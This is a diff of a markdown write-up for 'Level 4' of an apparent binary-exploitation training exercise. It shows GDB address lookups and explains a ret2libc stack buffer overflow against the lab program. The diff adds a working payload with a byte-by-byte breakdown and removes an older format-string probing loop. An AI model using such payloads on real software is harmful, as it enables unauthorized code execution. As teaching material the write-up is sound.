@@ -1,6 +1,13 @@
 <h1 align="center"> LEVEL 4 </h1>
 
-## 🔍 Analysis of Decompiled [level4]
+## 🔍 Analysis of Decompiled [level4](pseudo.c)
+
+This level exploits a **stack buffer overflow**. The program has an input buffer that can be overflowed to hijack the return address.
+
+**The vulnerability** exists in a function that reads user input into a fixed-size buffer without bounds checking:
+
+### The Addresses (found via GDB)
+
 ```bash
 (gdb) info proc map
 process 1869
@@ -30,17 +37,31 @@ Mapped address spaces:
 
 (gdb) x system
 0xf7e6aed0 <system>:	 "\203\354\034\211t$\024\213t$ \211\\$\020菮\016"
+```
 
-HEX2LITTLE output:
+[Hex2little](hex2little.py) output
 
+```bash
 python3 hex2little.py 
 sh     -->  \xec\x97\xf8\xf7
 system -->  \xd0\xae\xe6\xf7
-
-PAYLOAD:
-
-(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level04
-
-for(( i = 1; i < 40; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
-
 ```
+**Breakdown:**
+1. `"A"*156` - **Buffer padding** (156 bytes to reach return address)
+2. `"\xd0\xae\xe6\xf7"` - **system() address** (little-endian)
+3. `"EXIT"` - **Filler** (4 bytes for alignment)
+4. `"\xec\x97\xf8\xf7"` - **"/bin/sh" address** (little-endian)
+
+
+fgets writes 156+ bytes into 100-byte buffer overwrites the return address on the stack
+
+## Final Payload
+
+```bash
+(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level04
+```
+
+
+
+
+
